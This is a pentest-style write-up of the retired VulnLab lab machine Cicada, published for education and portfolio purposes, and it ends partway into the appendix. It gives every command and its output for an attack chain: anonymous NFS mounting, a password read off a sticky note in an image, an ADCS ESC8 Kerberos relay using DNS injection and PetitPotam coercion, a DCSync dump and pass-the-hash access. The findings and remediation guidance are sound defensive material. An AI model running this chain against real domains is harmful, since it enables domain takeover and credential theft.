# Cicada — VulnLab Report

| Difficulty | OS      | Category                   |
| ---------- | ------- | -------------------------- |
| Medium     | Windows | Active Directory Exploitation |

> Writeup of a retired Cicada machine, published for educational/portfolio purposes.

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Scope](#scope)
- [Approach / Methodology](#approach--methodology)
- [Tools Used](#tools-used)
- [Assessment Summary (Findings Overview)](#assessment-summary-findings-overview)
- [Attack Chain Walkthrough](#attack-chain-walkthrough)
  * [1.1. Reconnaissance](#11-reconnaissance)
  * [1.2. NFS Share Enumeration and File Discovery](#12-nfs-share-enumeration-and-file-discovery)
  * [1.3. Credential Discovery via Image File Inspection](#13-credential-discovery-via-image-file-inspection)
  * [2.1. Kerberos Authentication and SMB Share Enumeration](#21-kerberos-authentication-and-smb-share-enumeration)
  * [2.2. ADCS Certificate Authority Enumeration](#22-adcs-certificate-authority-enumeration)
  * [2.3. Kerberos Relay Attack Chain](#23-kerberos-relay-attack-chain)
  * [2.4. DC Machine Account NT Hash Extraction](#24-dc-machine-account-nt-hash-extraction)
  * [3.1. Domain Credential Dump via DCSync](#31-domain-credential-dump-via-dcsync)
  * [3.2. Administrator Shell and Flag Retrieval](#32-administrator-shell-and-flag-retrieval)
- [Technical Findings Details](#technical-findings-details)
- [Remediation Summary](#remediation-summary)
- [Lessons Learned / Skills Demonstrated](#lessons-learned--skills-demonstrated)
- [Appendix](#appendix)
  * [A. Finding Severity Definitions](#a-finding-severity-definitions)
  * [B. Exploited Hosts](#b-exploited-hosts)
  * [C. Compromised Users / Credentials](#c-compromised-users--credentials)
  * [D. Command Reference Log](#d-command-reference-log)
  * [E. References](#e-references)

---

## Executive Summary

**Target:** `Cicada / IP: 10.129.234.48`
**Platform:** `VulnLab`
**Date Completed:** `October 19, 2026`
**Assessment Type:** `Active Directory / Windows Host`
**Approach:** `Black box` — tested with `no prior knowledge`.

Pheenix Security was engaged to conduct a simulated attack against the VulnLab Cicada environment. The engagement was performed from the perspective of an unauthenticated external attacker with no prior access, credentials, or knowledge of the target network.

The results are critical. Starting with no access whatsoever, our team achieved complete domain compromise of the `cicada.vl` Active Directory environment, gaining Administrator-level control over the Domain Controller. In a real-world scenario this would grant an attacker unrestricted access to every system, account, and piece of data in the organization.

Three security issues were identified that formed the full compromise path. An exposed NFS share allowed unauthenticated enumeration of domain user accounts and access to files in their profile directories. One of those files — an image — contained a plaintext password written on a sticky note visible within the image. The recovered credential, combined with a misconfiguration in Active Directory Certificate Services (ADCS), allowed a Kerberos relay attack that issued a certificate impersonating the Domain Controller itself, enabling a full domain credential dump.

The overall risk is rated **Critical**. Immediate action is required on all three findings identified in this report.

---

## Scope

| Host / URL / IP Address          | Description                                                                 |
| --------------------------------- | --------------------------------------------------------------------------- |
| `DC-JPQ225.cicada.vl / 10.129.234.48` | Target machine — Windows Server Domain Controller (`cicada.vl` domain) |

> Testing was restricted to the host listed above, consistent with the platform's rules of engagement.

---

## Approach / Methodology

1. **Reconnaissance** — active port and service discovery against the target.
2. **Scanning & Enumeration** — NFS share and SMB share enumeration, file collection, and ADCS enumeration.
3. **Vulnerability Analysis** — identifying unauthenticated share exposure, credential leakage, and ADCS misconfigurations.
4. **Exploitation** — credential recovery from exposed NFS image file, Kerberos relay to ADCS via DNS injection and coercion.
5. **Privilege Escalation** — machine account certificate used to perform DCSync and recover domain Administrator credentials.
6. **Post-Exploitation** — validating full administrative access, capturing flags, and documenting impact.

---

## Tools Used

| Tool              | Purpose                                                                           |
| ----------------- | --------------------------------------------------------------------------------- |
| `Nmap`            | Port scanning and service enumeration                                             |
| `showmount`       | Enumerating NFS exports on the target                                             |
| `mount`           | Mounting the NFS share locally for file access                                    |
| `eog`             | Opening and inspecting image files from the NFS share                             |
| `crackmapexec`    | SMB authentication testing (NTLM and Kerberos)                                    |
| `netexec (nxc)`   | SMB share enumeration and coercion module (`coerce_plus`) execution               |
| `ntpdate`         | Synchronizing clock with the DC to prevent Kerberos time-skew failures            |
| `Certipy`         | ADCS vulnerability enumeration (ESC8 identification) and Kerberos relay listener  |
| `bloodyAD`        | Adding a malicious DNS record to the domain for Kerberos relay targeting          |
| `secretsdump`     | DCSync via the compromised DC machine account TGT to dump domain credentials      |
| `impacket-psexec` | Pass-the-hash execution as domain Administrator for interactive SYSTEM shell      |

---

## Assessment Summary (Findings Overview)

Starting from a completely unauthenticated position, a world-readable NFS share exposed domain user profile directories. An image file within one profile contained a plaintext password on a sticky note. That credential, combined with an HTTP-enabled ADCS web enrollment endpoint, enabled a Kerberos relay attack chain that produced a Domain Controller certificate. Using that certificate to authenticate as the DC machine account, all domain credentials were dumped via DCSync, resulting in full domain compromise. The overall risk is rated **Critical**.

| Severity      | Count |
| ------------- | ----- |
| Critical      | 2     |
| High          | 1     |
| Medium        | 0     |
| Low           | 0     |
| Informational | 0     |

| #  | Severity | Finding Name                                                               |
| -- | -------- | -------------------------------------------------------------------------- |
| 1  | Critical | Plaintext Credentials Embedded in Image File on World-Readable NFS Share   |
| 2  | Critical | ADCS ESC8 — HTTP Web Enrollment Enabling Kerberos Relay to Domain Compromise |
| 3  | High     | Unauthenticated NFS Share Exposing Domain User Profile Directories         |

*(Full detail on each finding is in the [Technical Findings Details](#technical-findings-details) section below.)*

---

## Attack Chain Walkthrough

> This section documents the full path from unauthenticated access to domain Administrator compromise, step by step, with commands and evidence. Lab IPs and credentials are shown as this is a retired VulnLab machine, published for educational and portfolio purposes.

### 1.1. Reconnaissance

```
sudo nmap 10.129.234.48 -p- -sC -sV
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-19 17:59 EDT
Nmap scan report for 10.129.234.48
Host is up (0.0067s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-19 22:01:39Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., ...)
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., ...)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., ...)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Findings:** The target is a Windows Server Domain Controller for the `cicada.vl` domain (hostname `DC-JPQ225`). Key services identified:

| Port | Service       | Significance                                                           |
| ---- | ------------- | ---------------------------------------------------------------------- |
| 53   | DNS           | Domain naming — confirms DC role                                       |
| 88   | Kerberos      | Authentication service — confirms DC role                              |
| 389/636 | LDAP/LDAPS | Directory services; LDAP confirmed domain `cicada.vl`                 |
| 445  | SMB           | File sharing — enumeration target                                      |
| 2049 | NFS           | Network File System — immediately high-value unauthenticated target    |
| 3389 | RDP           | Remote desktop                                                         |

Port 2049 (NFS) is highly unusual on a Domain Controller and immediately stands out as a potential unauthenticated access vector. A hosts entry was added for name resolution:

```
echo "10.129.234.48 DC-JPQ225.cicada.vl" | sudo tee -a /etc/hosts
```

---

### 1.2. NFS Share Enumeration and File Discovery

The NFS exports were queried unauthenticated:

```
showmount -e DC-JPQ225.cicada.vl
```

```
Export list for DC-JPQ225.cicada.vl:
/profiles (everyone)
```

**Findings:** The `/profiles` share is exported to `everyone` — accessible by any host without authentication. The share was mounted locally and its contents enumerated:

```
mkdir target-nfs
sudo mount -t nfs DC-JPQ225.cicada.vl:/ ./target-nfs/ -o nolock
cd target-nfs/
tree .
```

```
.
└── profiles
    ├── Administrator
    │   ├── Documents  [error opening dir]
    │   └── vacation.png
    ├── Daniel.Marshall
    ├── Debra.Wright
    ├── Jane.Carter
    ├── Jordan.Francis
    ├── Joyce.Andrews
    ├── Katie.Ward
    ├── Megan.Simpson
    ├── Richard.Gibbons
    ├── Rosie.Powell
    │   ├── Documents  [error opening dir]
    │   └── marketing.png
    └── Shirley.West
```

**Findings:** The share exposes a complete list of domain user accounts and contains two files: `vacation.png` in the Administrator profile and `marketing.png` in the `Rosie.Powell` profile. Both images were immediately flagged for inspection, as images stored in user profile shares by employees often contain inadvertently captured sensitive information.

The Administrator's `vacation.png` was opened first:

![vacation.png opened in the Eye of GNOME image viewer, showing a person paragliding while using a laptop — no sensitive information visible](./images/Pasted%20image%2020261019181113.png)

**Findings:** `vacation.png` contained no actionable information. Attention turned to `Rosie.Powell/marketing.png`.

---

### 1.3. Credential Discovery via Image File Inspection

Attempting to open `marketing.png` directly from the mounted NFS share failed due to file permissions:

![File manager showing the Rosie.Powell directory with marketing.png and Documents, alongside an Eye of GNOME error dialog: "Could not load image 'marketing.png'. Failed to open input stream for file"](./images/Pasted%20image%2020261019181528.png)

The file was copied locally, its permissions were corrected, and it was then opened:

```
sudo chmod 644 marketing.png
eog marketing.png
```

![marketing.png opened in the Eye of GNOME image viewer, showing a person working at a multi-monitor setup; a yellow sticky note on the desk reads "Cicada123"](./images/Pasted%20image%2020261019184500.png)

**Findings:** The image contained a sticky note clearly visible on the desk reading `Cicada123`. Given the share path `Rosie.Powell/marketing.png`, this is almost certainly `Rosie.Powell`'s workstation password. A credential pair of `Rosie.Powell : Cicada123` was recorded for testing.

---

### 2.1. Kerberos Authentication and SMB Share Enumeration

The recovered credential was tested against SMB:

```
crackmapexec smb cicada.vl -u Rosie.Powell -p 'Cicada123'
```

```
SMB  10.129.234.48  445  DC-JPQ225  [-] cicada.vl\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED
```

**Findings:** NTLM authentication is disabled on this DC — `STATUS_NOT_SUPPORTED` is returned. Kerberos authentication is required. After synchronizing the local clock with the DC (Kerberos requires clock skew to be under 5 minutes), the authentication was retried with the `-k` flag:

```
ntpdate -u cicada.vl
crackmapexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -k
```

```
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123
```

**Result:** Kerberos authentication succeeded. SMB shares were enumerated:

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p 'Cicada123' -k --shares
```

```
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  Share           Permissions     Remark
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  -----           -----------     ------
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  ADMIN$                          Remote Admin
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  C$                              Default share
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  CertEnroll      READ            Active Directory Certificate Services share
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  IPC$            READ            Remote IPC
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  NETLOGON        READ            Logon server share
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  profiles$       READ,WRITE
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  SYSVOL          READ            Logon server share
```

**Findings:** The presence of a `CertEnroll` share confirms Active Directory Certificate Services (ADCS) is deployed. ADCS is a common privilege escalation vector. The `profiles$` share is also accessible with read/write permissions.

---

### 2.2. ADCS Certificate Authority Enumeration

Certipy was used to enumerate the ADCS configuration and identify vulnerable certificate templates or CA settings:

```
certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
```

```
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Validity Start          : 2026-10-19 21:53:55+00:00
    Certificate Validity End            : 2526-10-19 22:03:55+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators / Domain Admins / Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators / Domain Admins / Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

**Findings:** The CA `cicada-DC-JPQ225-CA` is vulnerable to **ESC8** — web enrollment is enabled over unencrypted HTTP. No vulnerable certificate templates were identified independently, but ESC8 alone is exploitable via Kerberos relay. The attack works as follows: by registering a crafted DNS record pointing to the attacker's machine, then coercing the Domain Controller to authenticate to that hostname over SMB, the incoming Kerberos authentication can be relayed to the ADCS HTTP web enrollment endpoint to request a certificate on behalf of the DC machine account. This certificate can then be used to authenticate as the DC and perform a DCSync to dump all domain credentials.

NTLM relay and NTLM authentication in general are disabled in this environment, so the relay must operate over Kerberos — a technique described in detail in [Synacktiv's Kerberos relay research](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html).

---

### 2.3. Kerberos Relay Attack Chain

The attack was executed in three coordinated steps: DNS injection, relay listener setup, and coercion trigger.

**Step 1 — DNS Record Injection (bloodyAD)**

A malicious DNS `A` record was added to the domain pointing a crafted hostname back to the attacker's IP. The hostname includes a Kerberos delegation suffix that signals the DC to use unconstrained delegation when authenticating to it:

```
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl \
  add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.188
```

```
[+] Adding "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" to ...
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

**Step 2 — Certipy Relay Listener**

Certipy was started in relay mode, listening on port 445 and targeting the ADCS HTTP web enrollment endpoint, with the `DomainController` certificate template specified:

```
certipy relay -target 'http://dc-jpq255.cicada.vl/' -template DomainController
```

```
[*] Targeting http://dc-jpq255.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

**Step 3 — PetitPotam Coercion (netexec `coerce_plus`)**

The DC was coerced into authenticating to the malicious DNS hostname using the EfsRpcAddUsersToFile method via the `coerce_plus` module:

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k \
  -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
```

```
SMB  DC-JPQ225.cicada.vl  445  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS  DC-JPQ225.cicada.vl  445  DC-JPQ225  VULNERABLE, PetitPotam
COERCE_PLUS  DC-JPQ225.cicada.vl  445  DC-JPQ225  Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

**Certipy relay output (certificate issued):**

```
[*] (SMB): Received connection from 10.129.234.48, attacking target http://dc-jpq255.cicada.vl
[*] HTTP Request: GET http://dc-jpq255.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://dc-jpq255.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] Certificate issued with request ID 89
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

**Result:** A certificate for `DC-JPQ225.cicada.vl` was successfully issued and saved as `dc-jpq225.pfx`.

---

### 2.4. DC Machine Account NT Hash Extraction

The DC certificate was used to authenticate to the domain via Kerberos PKINIT and retrieve the NT hash of the DC machine account:

```
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
```

```
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

**Result:** A Kerberos TGT (`dc-jpq225.ccache`) and the NT hash for the DC machine account (`dc-jpq225$`) were successfully obtained. The machine account TGT is sufficient to perform a DCSync attack.

---

### 3.1. Domain Credential Dump via DCSync

Using the DC machine account TGT, `secretsdump` was invoked to perform a DCSync and extract the domain Administrator credentials:

```
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass \
  cicada.vl/dc-jpq225$@dc-jpq225.cicada.vl -just-dc-user administrator
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
```

**Domain Administrator NT hash:** `85a0da53871a9d56b6cd05deda3a5e87`

---

### 3.2. Administrator Shell and Flag Retrieval

The Administrator NT hash was used for pass-the-hash access via `impacket-psexec`:

```
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
```

```
[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file wIYizetG.exe
[*] Creating service qsuN on DC-JPQ225.cicada.vl.....
[*] Starting service qsuN.....
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```
c:\Users\Administrator\Desktop> type user.txt
aba8a33904b2a450e0b4b022bb25b5ee

c:\Users\Administrator\Desktop> type root.txt
f452e358484342a25b8a390b986f52fa
```

**user.txt:** `aba8a33904b2a450e0b4b022bb25b5ee`
**root.txt:** `f452e358484342a25b8a390b986f52fa`

Full domain compromise was achieved.

---

## Technical Findings Details

### 1. Plaintext Credentials Embedded in Image File on World-Readable NFS Share — Critical

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |
| **CVSS 3.1 Score** | 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Description (Incl. Root Cause)** | The file `marketing.png` in user `Rosie.Powell`'s NFS profile directory contained a photograph of a workstation with a sticky note bearing the plaintext password `Cicada123` clearly visible. The root cause is the combination of sensitive credential material being stored in an image file and that file being world-readable via an unauthenticated NFS share. No authentication or access control prevented any network-connected host from mounting the share and viewing the file. |
| **Security Impact** | Any unauthenticated attacker with network access to port 2049 could mount the NFS share and retrieve valid domain credentials for `Rosie.Powell`, gaining an authenticated foothold in the Active Directory domain. In this assessment, these credentials were used to enumerate ADCS and initiate the full Kerberos relay attack chain leading to domain compromise. |
| **Affected Host(s)** | `DC-JPQ225.cicada.vl` (10.129.234.48) — NFS `/profiles` export |
| **Remediation** | - Remove NFS shares from Domain Controllers entirely; user profile shares should be served over SMB with appropriate authentication controls.<br>- If NFS shares are required, configure host-based access controls (not `everyone`) using `/etc/exports` restrictions or Active Directory-integrated NFS permissions.<br>- Enforce organizational policies prohibiting the documentation or storage of passwords in any human-readable or visual medium (notes, images, documents). |
| **References** | [MITRE ATT&CK: T1552.001 — Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)<br>[MITRE ATT&CK: T1135 — Network Share Discovery](https://attack.mitre.org/techniques/T1135/) |

**Evidence:**

```
showmount -e DC-JPQ225.cicada.vl
# Export list for DC-JPQ225.cicada.vl:
# /profiles (everyone)
```

![marketing.png opened in the Eye of GNOME image viewer, showing a person at a workstation with a yellow sticky note reading "Cicada123" clearly visible on the desk](./images/Pasted%20image%2020261019184500.png)

---

### 2. ADCS ESC8 — HTTP Web Enrollment Enabling Kerberos Relay to Domain Compromise — Critical

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-287: Improper Authentication; CWE-319: Cleartext Transmission of Sensitive Information |
| **CVSS 3.1 Score** | 9.8 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Description (Incl. Root Cause)** | The Active Directory Certificate Services Certificate Authority `cicada-DC-JPQ225-CA` has HTTP (non-TLS) web enrollment enabled (`http://dc-jpq255.cicada.vl/certsrv/`). This is the ESC8 misconfiguration. Because the enrollment endpoint accepts unauthenticated HTTP requests and Kerberos authentication can be relayed over SMB, an attacker with a valid domain account can: (1) inject a malicious DNS A record using `bloodyAD`, (2) start a Certipy relay listener, and (3) coerce the DC into authenticating to the malicious hostname via PetitPotam — causing the DC's Kerberos ticket to be relayed to the CA web enrollment endpoint. The CA then issues a `DomainController`-template certificate for the DC machine account. The root cause is the absence of TLS (HTTPS) on the web enrollment endpoint, which is required to prevent relay attacks. |
| **Security Impact** | Any authenticated domain user can exploit this to obtain a certificate for the Domain Controller machine account. That certificate can be used to retrieve the DC machine account's NT hash and TGT, which are sufficient to perform a DCSync and extract all domain credentials, including the domain Administrator hash. This results in immediate, complete domain compromise. |
| **Affected Host(s)** | `DC-JPQ225.cicada.vl` (10.129.234.48) — ADCS CA web enrollment on port 80/HTTP |
| **Remediation** | - Immediately disable HTTP web enrollment on the CA; require HTTPS exclusively.<br>- If web enrollment is not required, disable the web enrollment role entirely via Server Manager.<br>- Enable Extended Protection for Authentication (EPA) on the ADCS web enrollment endpoint to prevent relay even over HTTPS.<br>- Enforce SMB signing (already enabled on this DC) and consider disabling the EFS RPC interface (PetitPotam coercion vector) via a firewall rule or GPO if it is not needed. |
| **References** | [SpecterOps: ESC8 — AD CS HTTP Web Endpoints](https://posts.specterops.io/certified-pre-owned-d95910965cd2)<br>[Synacktiv: Relaying Kerberos over SMB using KrbRelayX](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html)<br>[MITRE ATT&CK: T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)<br>[Certipy ESC8 documentation](https://github.com/ly4k/Certipy) |

**Evidence:**

```
certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k -vulnerable -stdout
# [!] Vulnerabilities
#   ESC8 : Web Enrollment is enabled over HTTP.
```

```
certipy relay -target 'http://dc-jpq255.cicada.vl/' -template DomainController
# [*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
# [*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

```
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
# [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

```
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225$@dc-jpq225.cicada.vl -just-dc-user administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
```

---

### 3. Unauthenticated NFS Share Exposing Domain User Profile Directories — High

| Field | Details |
| ----- | ------- |
| **CWE** | CWE-284: Improper Access Control |
| **CVSS 3.1 Score** | 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Description (Incl. Root Cause)** | The NFS export `/profiles` on `DC-JPQ225.cicada.vl` is configured with the access rule `(everyone)`, which allows any host on the network to mount the share without credentials. The share exposes profile directories for eleven domain user accounts, including the Administrator, revealing their usernames and any files present. The root cause is an overly permissive NFS export configuration combined with the deployment of NFS on a Domain Controller, which is an uncommon and high-risk combination. |
| **Security Impact** | Unauthenticated enumeration of the share yields a complete list of domain user accounts, which can be used for targeted password spraying and brute-force attacks. It also exposes any files stored in user profile directories to any attacker on the network, as demonstrated in Finding #1 where this access led directly to credential recovery. |
| **Affected Host(s)** | `DC-JPQ225.cicada.vl` (10.129.234.48) — NFS port 2049 |
| **Remediation** | - Remove the NFS role from the Domain Controller; DC roles should be minimized to reduce attack surface.<br>- If NFS-based profile shares are required, move them to a dedicated file server and restrict exports to specific host IP ranges using `/etc/exports` or Windows NFS access controls.<br>- Require Kerberos authentication for NFS access rather than permitting anonymous mounts. |
| **References** | [MITRE ATT&CK: T1135 — Network Share Discovery](https://attack.mitre.org/techniques/T1135/)<br>[CIS Benchmark: Minimize NFS role on Domain Controllers](https://www.cisecurity.org/cis-benchmarks) |

**Evidence:**

```
showmount -e DC-JPQ225.cicada.vl
# Export list for DC-JPQ225.cicada.vl:
# /profiles (everyone)

sudo mount -t nfs DC-JPQ225.cicada.vl:/ ./target-nfs/ -o nolock
tree ./target-nfs/
# └── profiles
#     ├── Administrator
#     ├── Daniel.Marshall
#     ├── Debra.Wright
#     ├── Jane.Carter
#     ├── Jordan.Francis
#     ├── Joyce.Andrews
#     ├── Katie.Ward
#     ├── Megan.Simpson
#     ├── Richard.Gibbons
#     ├── Rosie.Powell
#     └── Shirley.West
```

---

## Remediation Summary

### Short Term

- **Finding #1 (Plaintext Credentials Embedded in Image File)** — Revoke and reset the `Rosie.Powell` account password immediately. Search the NFS share for any additional files that may contain sensitive data and remove them. Apply this as a policy review action across all NFS profile shares.
- **Finding #2 (ADCS ESC8 — HTTP Web Enrollment)** — Disable HTTP access on the ADCS web enrollment endpoint and require HTTPS exclusively. If web enrollment is not actively used, disable the role entirely.
- **Finding #3 (Unauthenticated NFS Share)** — Restrict the NFS export immediately to specific trusted host IP ranges and require authentication; or, preferably, disable the NFS role on the DC while a migration plan is developed.

### Medium Term

- **Finding #2 (ADCS ESC8 — HTTP Web Enrollment)** — Enable Extended Protection for Authentication (EPA) on all ADCS web enrollment endpoints to mitigate relay even over HTTPS. Review all CA configurations for additional ADCS misconfigurations using Certipy or similar tooling.
- **Finding #3 (Unauthenticated NFS Share)** — Migrate user profile shares to a dedicated file server with SMB, proper access controls, and auditing enabled. Remove the NFS role from the Domain Controller.

### Long Term

- Implement a periodic review of Domain Controller roles and services to ensure the principle of least functionality — DCs should run only the services required for their core role (DNS, Kerberos, LDAP, AD DS).
- Develop and enforce a Credential Hygiene policy prohibiting the storage of passwords in any human-readable medium (notes, documents, images, spreadsheets, source code). Include periodic scanning of file shares for exposed credentials.
- Schedule quarterly ADCS health reviews using tooling such as Certipy or Locksmith as part of the Active Directory security assessment program.

---

## Lessons Learned / Skills Demonstrated

**Skill/Technique 1: NFS Enumeration as an Initial Foothold Vector.** Identifying and mounting world-readable NFS shares is a valuable but often overlooked reconnaissance step against Windows environments. The `showmount` and `mount` workflow yielded a full domain user list and sensitive files before any credentials were needed, demonstrating the importance of assessing all exposed services — not just the typical Windows ports.

**Skill/Technique 2: Steganographic and Visual Credential Hunting.** Credentials embedded in image files represent a category of secret exposure that automated scanning tools frequently miss. Viewing and carefully inspecting image files found in user-facing storage locations is a manual but high-yield technique, as attackers who do so can recover credentials that would otherwise be invisible to grep-based or text-only enumeration.

**Skill/Technique 3: ADCS ESC8 Identification with Certipy.** Using Certipy's `find -vulnerable` flag to audit an Active Directory Certificate Services deployment is a systematic and efficient way to surface CA-level misconfigurations like ESC8 (HTTP web enrollment) that bypass certificate template restrictions entirely. This is a critical enumeration step in any AD engagement.

**Skill/Technique 4: Kerberos Relay over SMB via DNS Record Injection.** Exploiting ESC8 in an NTLM-disabled environment required chaining three distinct techniques: injecting a DNS A record with `bloodyAD` to control a relay target, running `certipy relay` to forward the DC's Kerberos authentication to the ADCS HTTP endpoint, and triggering coercion with `nxc coerce_plus` (PetitPotam). Coordinating these steps demonstrates a deep understanding of Active Directory authentication, DNS trust, and ADCS interaction.

**Skill/Technique 5: Certificate-Based DCSync via Machine Account Impersonation.** Converting a DC certificate into an NT hash using Certipy's `auth` command (Kerberos PKINIT), then leveraging that hash and TGT to perform a targeted DCSync with `secretsdump`, illustrates the full post-exploitation impact of an ESC8 compromise — from a single image file to complete domain credential disclosure.

---

## Appendix

### A. Finding Severity Definitions

| Rating       | Definition |
| ------------ | ---------- |
| **Critical** | Exploitation leads to full system/domain compromise with little to no effort or prerequisites. |
| **High**     | Exploitation causes substantial harm to confidentiality, integrity, or availability. |
| **Medium**   | Exploitation has a moderate impact, or a high-impact issue with limited exposure. |
| **Low**      | Exploitation causes minimal impact to operations. |
| **Info**     | An observation or improvement opportunity; not itself a vulnerability. |

### B. Exploited Hosts

| Host                          | Method                                        | Notes                          |
| ----------------------------- | --------------------------------------------- | ------------------------------ |
| `DC-JPQ225.cicada.vl / 10.129.234.48` | Kerberos relay (ESC8) → DCSync → psexec | Domain Controller; full compromise |

### C. Compromised Users / Credentials

